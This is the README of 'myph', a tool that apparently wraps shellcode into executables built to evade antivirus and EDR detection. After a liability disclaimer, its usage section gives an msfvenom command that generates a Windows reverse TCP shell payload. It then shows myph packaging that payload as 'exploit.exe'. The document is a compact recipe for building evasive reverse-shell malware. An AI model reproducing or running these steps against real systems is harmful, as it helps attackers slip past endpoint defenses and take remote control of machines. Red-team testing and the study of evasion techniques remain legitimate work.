# myph

AV/EDR bypass payload creation tool

## Disclaimer

The access to and the use of the information on this repository is free of charge,
but implies the tacit acceptance by the user of the following conditions, without prejudice to the applicable legal provisions.
The user acknowledges that this repository is intended for informational purposes only and therefore serves only
for general information and testing. The tool and this repository are carefully compiled on the basis of good sources and references.

However, the developers cannot be held liable for for any damage, direct or indirect, of whatever nature as a result of
or related to the access to or use of the software.

## Usage

This tool uses the CRT method. If you don't know what that is, go check out [this repository](https://github.com/CMEPW/BypassAV) :)~

Generate a payload like so:

```bash
# generate your payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=80 -f raw -o msf.raw

# run myph
./myph --shellcode msf.raw --outfile exploit.exe
```
